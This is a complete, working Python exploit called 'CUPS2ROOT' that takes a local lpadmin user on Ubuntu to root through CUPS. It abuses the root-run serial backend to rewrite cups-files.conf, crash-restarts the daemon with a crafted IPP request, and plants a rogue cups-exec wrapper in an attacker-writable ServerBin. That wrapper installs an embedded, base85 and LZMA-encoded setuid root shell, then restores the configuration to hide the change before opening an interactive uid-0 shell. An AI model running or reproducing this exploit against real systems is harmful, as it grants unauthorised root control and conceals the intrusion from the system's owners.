#!/usr/bin/env python3
"""Ubuntu CUPS lpadmin-to-root chain: use the root serial backend to rewrite
cups-files.conf, restart into an attacker-writable ServerBin, execute an
embedded setuid shell installer through cups-exec, then restore the original
configuration before opening an interactive root shell."""
import base64
import grp
import lzma
import os
import platform
import shutil
import socket
import stat
import struct
import subprocess
import threading
import sys
import time

CUPS_FILES = "/etc/cups/cups-files.conf"
INTERFACES = "/etc/cups/interfaces"
SOCK = "/run/cups/cups.sock"
SER_Q = "cups2root"
SERIAL_SKIP = 2048
GENUINE_CUPS_EXEC = "/usr/lib/cups/daemon/cups-exec"
PROOF = INTERFACES + "/.c2r_root_proof"
LOCK = INTERFACES + "/.c2r_lock"
ROOTSH_SRC = INTERFACES + "/.c2rsh.src"
ROOTSH = INTERFACES + "/.c2rsh"

ROOTSHELL_PAYLOADS = {
    "amd64": (
        "{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;5df`_+0=$kwt`PJ&C5;is6GYPUUl#Zp1ckh;tgde$e%l;HvW4r!_$}!U9!9Iy$yS7iGbE"
        "gZyON^X37~?NL^QARD*b6^ojx(a*9z`in|d&s!0#fzzR6)3{gn+J?2K2h=<V>z?ABGOj+eC}d^IGLQT;^2BS!zD;S=Y99)|s7XZI"
        "*x|*jeqtlZPd?c^9=s%)<7+34%H^l&Tfj_!peo}RZ8l1|5{E;eyu}~t!u}f3mXgC}$mt3Urnx5`L-sMBFD2wTCxDIMt?iBRPda%#"
        "#dcXUpuaGLd03!)c0`^~G(uS@ur3>4caS~_at1*&)+|2ir<c~%5Msb)F2rUjosfA7s(C??tpJV5-Krg|l+|G#d0e0ZF+?dDX+51f"
        "g_1G+(iR~E=uc1gWuaZcIgXbgs;BkltYr^82i<H@Ji9NpAK;k>k+Q;RWXhn+JGY>?Jm*%2;ZsxLx+$Lgr_G9(p1NKA5^1k7H!ns^"
        "_Dn1T{oJ#swV8c#)HLOt=aZ+q&oJ7U8?mHqZS4?*Kx+imu=THG({5GdXgrXap97+zae5$MnAmN<gr47POev)z(#yJv71)h%Ea0aV"
        "mT3vdSz=Ljpf>8Ziu+O*$pu2vrkKAup=xACo&IhUCy<^>h0a_WJfC^PP1WCNiFaq6^y)Q8opS=x>0ecd(7%q<u9>C#c23f{tg#79"
        "ZM#NPFK(u`(>Z8dRl#Jqr?MmE@TE>A-xwN3d}B(`7l#dRFvaG*r7E7F1_P^tS=#rafb74ISB<SB#$deyf;Y>0M~PTtEybgKUrk(}"
        "nlv9mX{#0n9)=g@B6dS)`H#kQzB1|yM*#I3;+LT7TzqsYd>L!B?7pUwSkpJhl63a*+6bT%)!xNkdnBZM|K!&Dsnu*!YTr395kKnD"
        "!#O*zhYv9y&=(g3B2<ZYw6-Hd%oaG0#l7ANm4kJgD}~?ImWM59ek_QY=pN?Rb(t0!HfVZyNU#dp{|U(do)!blsByTgO?8=nP5|Q~"
        "c3rq2w!SSPo^9W`l}YjzwvZ8Bn}&Wgnjjsggd!l&TMa?`YWgxKd5_UGC;{v2f&bVh_hN$A;VcJM6Xr;q-kV4u)09A2@WvPbcPQfY"
        "gFboxFhSZvn+AQV%^NrAd6P_4?n)#{cQos&IUEB5neR`^u^3cfF29Lgg9B7VdBr~Ih>iH5g;99(hvnH<A3;0++hU-G3{KOO6u(MJ"
        "_%wKIULuOwa#MpJxy#b`P86CC>SB1frO)NAaJv-gJPe@s5m+#UUXWhTob5>^Bc;L%^i=-jf^LMB_?Duf4}@1ymbv#8`l*LXxW0SF"
        "Mp|(naD@n&f0;XvwBRK@k9BpA6)*f@5#Nr(BcOL!9R62!P>C<JMH!BFw1`xutwCJ~#2S^VD_6v0<Lz2-Mr(BqviMZ$tJ;tN%{Ykl"
        "md0@ju2Qx|F90wR3_vhys@h(2bB&IZ<wjEzCL@K(h`-a6#+!TJ17n6JOYL7qbKVUw)b!5~)O0*bTs9J|GNs}$;bD`sl9_`VqP5?n"
        "o#60u;XvkD8c74X+?RxRfsRBp_}hHTkmV5y_@RmBQZr%$J9esBwu_>usrCL$0)dD%WKn06PH;S*Q%drFxgbIbyb21{1uQL_s7_?N"
        "G?o3cKq+VDuRKE!Z-)j2ut-9`;7Ph!bIuv5>+2egVk>rxBGhM4@kocN@yADX4XThy-kf>8fJ2<+`CW`3G#kV@esr-QyC=S^M28af"
        "1;=8MC^bq4LtZEMIH|vyhd)%yoe<c2lgI1oVSUvC{a!6W|7BN|Q{&r2!oKjZM-DI#ht)P?b*Q5;#e{;ZvD8;^({<3)isuM6tNrZ?"
        "YD>ixvXmu!S>uy8prsid+<~IY4pu-`iHEc%I3QSXAWakReb-5%!B&6bV{v`k>Y8?x+d-^w)s;7(93DEIZ+j_H5-eG%mB?f2QyAD+"
        "q82;j6Vz7mCd0R<lIE?&`6IMk12U^Co?Y0Fd%3tS6ZI={6x09!`y4+_vQ=II00EQ?h;aY_I`NGCvBYQl0ssI200dcD"
    ),
    "arm64": (
        "{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;RmM%7hM29kwt`PJ&C5;is6PLqQcmIo<AuBuj8<E&yu3qfP90<wC?=1>`^n8z7$X7u}6$3"
        "!x1Ikm2|s1VG)zY6L&*;)O7scOo=xTPHv$V*HQdgsn{wHq2j3QNBEalk36kI@GW{JptEn1KLw=)x17|_!Z4|HO~%s{u%PHi|95u`"
        "`}?XyT5?~50e9_{TQMu%cKXIejho=6w)bx-z^uj=$CJLpnrn3ib7hZSJw{+;>K^wtrKB64uycP$<;U*qN5c%8KNsSCqf-X|g%qnC"
        "LQ^xLvIf$KnlH#YUDl4a9{R_hnkcvwa1e}$d&Qj$Hb@{3GPB@fCupYKJht%1hXjfX5c;-hl7gH``F$sT1s|w;rxi^Qc+_?$TRA!)"
        "kNO*#<qzJ<(?h4iG7pX0G_Zmo_AVaSNw3=n`BuRPwz9WB8h=jn7hlw8n4p9*=u;c%68IOjO!W~*DNyafm=A8NYO}>vyIEg0s?;S("
        "L0^OM<d-(+Cq-gq@Fq$7zEO%9W~?&QN2q^2PP4F$X#S;b1h|-(Qc~*Sy3J#$@Yo;<!+<%k{5EamNZDo8ICL){-ENhfuK_NjWZlhU"
        "QjdqyxvI<0{zZnlicY^nb%C*Fmi(qBV03e}rfE+3(-S(Os$h(IctfyCWJjXJbU;(0d}zUVfhPpOsT{!iSyJR{izZh|-nQR~W}E11"
        "p9sAkKXgne@VO@5{--<t&dpJ3pH%Le{VwXtC(q7JgaWYY;>y@@b%nkkhU6#re5V?4sJna?51o&*3@VA;rnOe7l9z~#RAXML-kbM9"
        "<kG}n9qMqSf5@!8^Wj&CvURLN{v@5ziP4D)*AjYDC}4(mADej0!I)rO6V1K+vPmvjclJ5fwx}!UZC2&8sW~;Eav0o^A_p$7@Na|m"
        "d%Tdr_&8iG1d|TV-sOd5!VTy3i0W8B;0q=dvfu-wcV7@3z|}=!oXQHPIOo9x-|*9!_K-=W*2lbEc8eTg+h%~Z(DuwHeL^I}-E<n1"
        "m(<gs=81!H8Kh3O+z55%p)Cm;K&hHX+2liIsuP)SM0_rmGK{TB<3^F8DmeyGhItmeT4FjWk7UZv%0S5mBZVbVTddb5N#LYT))J;S"
        "H<?>POxfwYzMj6nfK5%okLU-)Ev<O=5qH6J2dM}ILs3O~5R<&`#}?rq5%t4<--Q3!yhm|lnh-Yda3>9eqDzwssQg2Vj4j>G4g8q)"
        "zAiRn%<3Tyv2IR@668r@4vo9nAY5id?**i12ofz++K_U{ndW&=DF^$`nQqeDRfw;wgvAHpAuU8tdjF9v(b6vg4SBse45xbo7-tC1"
        "#CZN`UV%{c^pL1g%Uih(FiNcLz}t8&Yc!`q+F7N_)e&3z(uRJ{X#1lGXWz%4nQdN&c>{}58pJz*4_36(p#^R;IDoEYV8HopLAa|u"
        "_0%W#iN9J4r}1LJfC=SRGyV`0Q=V=ZdvDow(N~Z*0>kGlBThkqM7b8BvGo(BmX0n6z<1l(uiH>?#`2lB3*V;FS{UBk@)&GSlgx@}"
        "Bj-)M4iCt)gCRk6(|t>}W}K`NDDB{`4M8@NZ@x>_kgDR9=1WF&VKH=gzX4oO8QfeS*2#6s!sTdwa%djDf~|2F^|-MYoj<yisH$I;"
        "&xZS;4amn0Ac~<Kt3Pw4T3HoXVgr<w&Ci9W&iEJNZL_UjGVMtEdpd{PvGRV>qa4#i$_AjyH4W?k!;#1?uRl-qWph>EZWotv2hxM1"
        "U8^g8pzN;S`BNIqM{{N{6~wFbA+7Fv|NRZKKN3|`N*432tZx9SAHF-JoV}~rOttdD#VuZB-~iEG*;L#y2<*dAK`gaAfNNI#HbLN~"
        "#oiKhj&ToRgk{nzBVrcK1m+IotIFXLLsA>&P6;oEHafkp*(N-aL|JzY(Ufed=^N-xJEi-7`>wI)_wm5TugVhtqfKV!h|xQr<yF{r"
        "1km<pV@nAxV4x@jAQ+W}K||M%iN7JAsbI@uRit@?C_H#gHMitBC&pjqg&B(ca6mLeiQo18fc&V4<Q(%$OaK!jB+dW;U<}abDTdtg"
        "00FZMsE-5yRPZ63vBYQl0ssI200dcD"
    ),
}



class _Ansi:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[38;5;203m"
    GREEN = "\033[38;5;84m"
    YELLOW = "\033[38;5;221m"
    BLUE = "\033[38;5;75m"
    CYAN = "\033[38;5;51m"
    GREY = "\033[38;5;245m"
    ORANGE = "\033[38;5;215m"
    WHITE = "\033[38;5;255m"


_USE_COLOR = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
BANNER = (
    r" ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██████╗  ██████╗  ██████╗ ████████╗",
    r"██╔════╝██║   ██║██╔══██╗██╔════╝╚════██╗██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝",
    r"██║     ██║   ██║██████╔╝███████╗ █████╔╝██████╔╝██║   ██║██║   ██║   ██║   ",
    r"██║     ██║   ██║██╔═══╝ ╚════██║██╔═══╝ ██╔══██╗██║   ██║██║   ██║   ██║   ",
    r"╚██████╗╚██████╔╝██║     ███████║██████╗ ██║  ██║╚██████╔╝╚██████╔╝   ██║   ",
    r" ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ",
)
BANNER_COLORS = (_Ansi.ORANGE, _Ansi.ORANGE, _Ansi.ORANGE,
                 _Ansi.YELLOW, _Ansi.YELLOW, _Ansi.YELLOW)


def _paint(text, *codes):
    if not _USE_COLOR:
        return text
    return "".join(codes) + text + _Ansi.RESET


def _emit(line=""):
    sys.stdout.write(line + "\n")
    sys.stdout.flush()


def show_banner():
    print("")
    for row, tint in zip(BANNER, BANNER_COLORS):
        _emit(_paint("  " + row, _Ansi.BOLD, tint))
    _emit(_paint("       ┌─ Ubuntu 26.04 LTS ─ ", _Ansi.GREY)
          + _paint("local privilege escalation", _Ansi.DIM, _Ansi.WHITE)
          + _paint(" ─┐", _Ansi.GREY))


def rule():
    _emit(_paint("  " + "─" * 77, _Ansi.DIM, _Ansi.GREY))


def field(key, value, tint=_Ansi.WHITE):
    _emit("  " + _paint("%-11s" % key, _Ansi.DIM, _Ansi.GREY)
          + _paint("│ ", _Ansi.DIM, _Ansi.GREY)
          + _paint(str(value), _Ansi.BOLD, tint))


def phase(name):
    _emit("  " + _paint("▸", _Ansi.BOLD, _Ansi.BLUE)
          + " " + _paint(name, _Ansi.BOLD, _Ansi.CYAN))


def log(message, level="info"):
    color = {"ok": _Ansi.GREEN, "warn": _Ansi.YELLOW,
             "error": _Ansi.RED}.get(level, _Ansi.GREY)
    marker = {"ok": "✓", "warn": "!", "error": "✗"}.get(level, "·")
    _emit("  " + _paint(marker, _Ansi.BOLD, color)
          + "     " + _paint(message, _Ansi.BOLD if level == "error" else color))


def show_root_shell():
    _emit("  " + _paint("✓", _Ansi.BOLD, _Ansi.GREEN)
          + "     " + _paint("Root shell dropped", _Ansi.BOLD, _Ansi.GREEN)
          + _paint("  ·  interactive uid 0  ·  type exit to return", _Ansi.GREY))


class Spinner:
    FRAMES = ("⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏")

    def __init__(self, label, color=_Ansi.CYAN):
        self.label = label
        self.color = color
        self.animated = False
        self.stop = None
        self.thread = None

    def __enter__(self):
        self.animated = sys.stdout.isatty()
        if self.animated:
            self.stop = threading.Event()
            self.thread = threading.Thread(target=self._animate, daemon=True)
            self.thread.start()
        else:
            log(self.label)
        return self

    def _animate(self):
        index = 0
        while not self.stop.is_set():
            frame = self.FRAMES[index % len(self.FRAMES)]
            sys.stdout.write("\r\033[2K  %s     %s" %
                             (_paint(frame, _Ansi.BOLD, self.color),
                              _paint(self.label, _Ansi.GREY)))
            sys.stdout.flush()
            index += 1
            self.stop.wait(0.08)

    def __exit__(self, exc_type, exc, traceback):
        if self.animated:
            self.stop.set()
            self.thread.join()
            sys.stdout.write("\r\033[2K")
            sys.stdout.flush()
        if exc_type is None:
            log("%s complete" % self.label, "ok")
        else:
            log("%s failed" % self.label, "error")
        return False


def run(argv, inp=None, timeout=45):
    return subprocess.run(argv, input=inp, capture_output=True, text=True, timeout=timeout)


def main_pid():
    try:
        return int(run(["systemctl", "show", "cups", "-p", "MainPID", "--value"]).stdout.strip())
    except (ValueError, subprocess.SubprocessError):
        return 0


def is_active():
    return run(["systemctl", "is-active", "cups"]).stdout.strip() == "active"


def cups_responsive():
    try:
        return is_active() and run(["lpstat", "-r"], timeout=8).returncode == 0
    except subprocess.TimeoutExpired:
        return False



def restart_request():
    op, subscription_group, end = 0x01, 0x06, 0x03
    tag_charset, tag_language, tag_uri, tag_keyword, tag_resolution = 0x47, 0x48, 0x45, 0x44, 0x32

    def attr(tag, name, value):
        name = name.encode()
        value = value if isinstance(value, bytes) else value.encode()
        return bytes([tag]) + struct.pack("!H", len(name)) + name + struct.pack("!H", len(value)) + value

    attrs = (bytes([op])
             + attr(tag_charset, "attributes-charset", "utf-8")
             + attr(tag_language, "attributes-natural-language", "en")
             + attr(tag_uri, "printer-uri", "ipp://localhost/")
             + bytes([subscription_group])
             + attr(tag_keyword, "notify-events", "printer-state-changed")
             + attr(tag_uri, "notify-recipient-uri", "rss://localhost/rss")
             + attr(tag_resolution, "notify-natural-language", struct.pack("!iiB", 300, 300, 3))
             + bytes([end]))
    body = struct.pack("!BBHI", 2, 0, 0x0016, 0x02000001) + attrs
    headers = ("POST / HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/ipp\r\n"
               "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body)).encode()
    return headers + body


def request_restart():
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(SOCK)
        sock.sendall(restart_request())
        try:
            sock.recv(256)
        except OSError:
            pass
        sock.close()
    except OSError as exc:
        log("Restart request note: %s" % exc)


def restart_cups(timeout=120):
    previous_pid = main_pid()
    request_restart()
    deadline = time.time() + timeout
    while time.time() < deadline:
        pid = main_pid()
        if pid not in (0, previous_pid) and cups_responsive():
            return pid
        time.sleep(0.5)
    raise RuntimeError("CUPS did not become responsive after restarting")



def read_cups_files():
    with open(CUPS_FILES, "r", errors="replace") as handle:
        return handle.read()


def ensure_serial_queue():
    result = run(["lpadmin", "-p", SER_Q,
                  "-v", "serial:%s?baud=115200" % CUPS_FILES,
                  "-o", "printer-error-policy=abort-job", "-E"])
    if result.returncode != 0:
        raise RuntimeError("unable to create serial queue: %s" %
                           ((result.stderr or result.stdout).strip(),))
    run(["cupsenable", SER_Q])
    run(["cupsaccept", SER_Q])


def serial_write_expected(expected):
    if len(expected) <= SERIAL_SKIP:
        raise RuntimeError("cups-files.conf is shorter than serial backchannel offset")
    payload = expected[SERIAL_SKIP:]
    ensure_serial_queue()
    for _ in range(6):
        run(["cancel", "-a"], timeout=15)
        run(["lp", "-d", SER_Q, "-o", "raw"], inp=payload, timeout=30)
        for _ in range(20):
            time.sleep(0.25)
            if read_cups_files() == expected:
                return
    raise RuntimeError("serial config write did not produce the exact expected bytes")


def injected_config(original, group_name):
    block = ("\nGroup %s\nRequestRoot %s\nServerRoot %s\n"
             "TempDir %s\nServerBin %s\n#"
             % (group_name, INTERFACES, INTERFACES, INTERFACES, INTERFACES))
    if len(block) >= len(original) - SERIAL_SKIP:
        raise RuntimeError("cups-files.conf is too short for the configuration update")
    return (original[:SERIAL_SKIP] + block
            + original[SERIAL_SKIP + len(block):])







def trigger_cgi():
    request = b"GET /printers/ HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(8)
    try:
        sock.connect(SOCK)
        sock.sendall(request)
        try:
            sock.recv(1024)
        except OSError:
            pass
    finally:
        sock.close()





def rootshell_blob():
    architecture = {"x86_64": "amd64", "aarch64": "arm64"}.get(platform.machine())
    encoded = ROOTSHELL_PAYLOADS.get(architecture)
    if encoded is None:
        raise RuntimeError("no embedded shell for architecture %s" % platform.machine())
    try:
        return lzma.decompress(base64.b85decode(encoded))
    except (ValueError, lzma.LZMAError) as exc:
        raise RuntimeError("embedded shell payload is invalid") from exc


def build_cups_exec(original_b64):
    return ("""#!/bin/sh
LOCK=%(lock)s
if ! mkdir "$LOCK" 2>/dev/null; then
  exec %(genuine)s "$@"
fi
OUT=%(interfaces)s/.c2r_proof.$$
cp -f %(src)s %(dst)s 2>/dev/null
chown 0:0 %(dst)s 2>/dev/null
chmod 6755 %(dst)s 2>/dev/null
ROOT_UID=$(id -u)
echo %(original_b64)s | base64 -d > %(cups_files)s 2>/dev/null
chmod 0644 %(cups_files)s 2>/dev/null
ln -sfn %(genuine)s %(interfaces)s/.c2r-real.$$
mv -Tf %(interfaces)s/.c2r-real.$$ %(interfaces)s/cups-exec
printf '%%s\n' "$ROOT_UID" > "$OUT"
chmod 0644 "$OUT"
mv -f "$OUT" %(proof)s
chown %(caller_uid)s:%(caller_gid)s %(proof)s 2>/dev/null || true
rmdir "$LOCK" 2>/dev/null || true
exit 0
""") % {
        "lock": LOCK,
        "genuine": GENUINE_CUPS_EXEC,
        "interfaces": INTERFACES,
        "src": ROOTSH_SRC,
        "dst": ROOTSH,
        "original_b64": original_b64,
        "cups_files": CUPS_FILES,
        "proof": PROOF,
        "caller_uid": os.getuid(),
        "caller_gid": os.getgid(),
    }


def replace_with_symlink(path, target):
    try:
        if os.path.lexists(path):
            if os.path.isdir(path) and not os.path.islink(path):
                shutil.rmtree(path)
            else:
                os.remove(path)
        os.symlink(target, path)
    except OSError as exc:
        raise RuntimeError("unable to create %s -> %s: %s" % (path, target, exc))


def stage_serverbin(wrapper, root_blob):
    info = os.stat(INTERFACES)
    if info.st_gid != os.getgid() or not (info.st_mode & stat.S_IWGRP):
        raise RuntimeError("interfaces was not made writable by the caller's primary group")

    try:
        if os.path.isdir(LOCK):
            os.rmdir(LOCK)
    except OSError:
        pass
    for path in (PROOF, ROOTSH, ROOTSH_SRC):
        try:
            os.remove(path)
        except OSError:
            pass

    if root_blob is not None:
        with open(ROOTSH_SRC, "wb") as handle:
            handle.write(root_blob)
        os.chmod(ROOTSH_SRC, 0o755)

    replace_with_symlink(os.path.join(INTERFACES, "daemon"), ".")
    replace_with_symlink(os.path.join(INTERFACES, "cups-driverd"),
                         "/usr/lib/cups/daemon/cups-driverd")
    replace_with_symlink(os.path.join(INTERFACES, "cups-deviced"),
                         "/usr/lib/cups/daemon/cups-deviced")
    for directory in ("filter", "backend", "cgi-bin", "driver", "notifier", "monitor"):
        replace_with_symlink(os.path.join(INTERFACES, directory),
                             "/usr/lib/cups/%s" % directory)

    temporary = os.path.join(INTERFACES, ".cups-exec.%d" % os.getpid())
    with open(temporary, "w") as handle:
        handle.write(wrapper)
    os.chmod(temporary, 0o755)
    os.replace(temporary, os.path.join(INTERFACES, "cups-exec"))


def install_genuine_wrapper():
    try:
        info = os.stat(INTERFACES)
        if info.st_gid != os.getgid() or not (info.st_mode & stat.S_IWGRP):
            return
        temporary = os.path.join(INTERFACES, ".c2r-genuine.%d" % os.getpid())
        try:
            os.remove(temporary)
        except OSError:
            pass
        os.symlink(GENUINE_CUPS_EXEC, temporary)
        os.replace(temporary, os.path.join(INTERFACES, "cups-exec"))
    except OSError:
        pass


def rootshell_ready():
    try:
        info = os.stat(ROOTSH)
        return info.st_uid == 0 and bool(info.st_mode & stat.S_ISUID)
    except OSError:
        return False



def preflight():
    log("Checking prerequisites")
    if "lpadmin" not in run(["id"]).stdout:
        raise RuntimeError("caller is not in lpadmin")
    group_name = grp.getgrgid(os.getgid()).gr_name
    active_system_groups = []
    for line in read_cups_files().splitlines():
        stripped = line.strip()
        if stripped and not stripped.startswith("#") and stripped.lower().startswith("systemgroup "):
            active_system_groups.extend(stripped.split()[1:])
    if group_name in active_system_groups or group_name in ("root", "lpadmin"):
        raise RuntimeError("primary group %s cannot be used as CUPS Group" % group_name)
    backend = "/usr/lib/cups/backend/serial"
    if not os.path.exists(backend):
        raise RuntimeError("missing serial backend")
    mode = os.stat(backend).st_mode
    if mode & (stat.S_IWGRP | stat.S_IWOTH | stat.S_IXOTH):
        raise RuntimeError("serial backend does not run as root")
    if not os.path.isdir(INTERFACES):
        raise RuntimeError("missing %s" % INTERFACES)
    root_blob = rootshell_blob()
    if not cups_responsive():
        raise RuntimeError("CUPS is not active and responsive")
    log("Prerequisites satisfied", "ok")
    return group_name, root_blob


def remove_local_artifacts():
    for path in (PROOF, ROOTSH_SRC, ROOTSH):
        try:
            os.remove(path)
        except OSError:
            pass


def main():
    show_banner()
    rule()
    field("context", "local lpadmin session", _Ansi.CYAN)
    field("objective", "interactive root shell", _Ansi.ORANGE)
    rule()
    phase("Preflight")
    group_name, root_blob = preflight()
    original = read_cups_files()
    original_b64 = base64.b64encode(original.encode()).decode()
    expected = injected_config(original, group_name)
    restarted_pid = 0
    planted = False
    root_fired = False

    try:
        phase("Preparing CUPS")
        with Spinner("Writing temporary CUPS configuration"):
            serial_write_expected(expected)

        phase("Restarting CUPS")
        log("Triggering bug", "warn")
        with Spinner("Crash-restarting CUPS", _Ansi.YELLOW):
            restarted_pid = restart_cups()

        phase("Acquiring root")
        with Spinner("Preparing privileged execution"):
            stage_serverbin(build_cups_exec(original_b64), root_blob)
            planted = True
            deadline = time.time() + 45
            trigger_error = None
            while time.time() < deadline and not os.path.exists(PROOF):
                try:
                    trigger_cgi()
                except OSError as exc:
                    trigger_error = exc
                time.sleep(0.25)

        if trigger_error is not None and not os.path.exists(PROOF):
            log("Execution trigger note: %s" % trigger_error, "warn")
        if not os.path.exists(PROOF):
            raise RuntimeError("privileged execution did not start")
        with open(PROOF, errors="replace") as handle:
            root_fired = handle.read().strip() == "0"
        if not root_fired:
            raise RuntimeError("privileged execution did not obtain root access")

        phase("Restoring state")
        with Spinner("Verifying CUPS restoration"):
            for _ in range(40):
                if read_cups_files() == original:
                    break
                time.sleep(0.25)
            if read_cups_files() != original:
                raise RuntimeError("the original CUPS configuration was not restored")
            if main_pid() != restarted_pid:
                raise RuntimeError("CUPS restarted unexpectedly")
            if not rootshell_ready():
                raise RuntimeError("the privileged shell was not installed")

        show_root_shell()
        shell_rc = subprocess.call([ROOTSH])
        cleanup_command = "rm -f %s %s %s; exit\n" % (ROOTSH, ROOTSH_SRC, PROOF)
        try:
            subprocess.run([ROOTSH], input=cleanup_command, text=True,
                           capture_output=True, timeout=15)
        except (OSError, subprocess.SubprocessError):
            pass
        return shell_rc
    finally:
        run(["lpadmin", "-x", SER_Q], timeout=15)
        if not root_fired and read_cups_files() != original:
            try:
                serial_write_expected(original)
            except Exception as exc:
                log("Configuration restore note: %s" % exc, "warn")
        if planted and not root_fired:
            install_genuine_wrapper()
        remove_local_artifacts()
        log("Cleanup complete", "ok")


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as exc:
        log("Error: %s" % exc, "error")
        sys.exit(1)
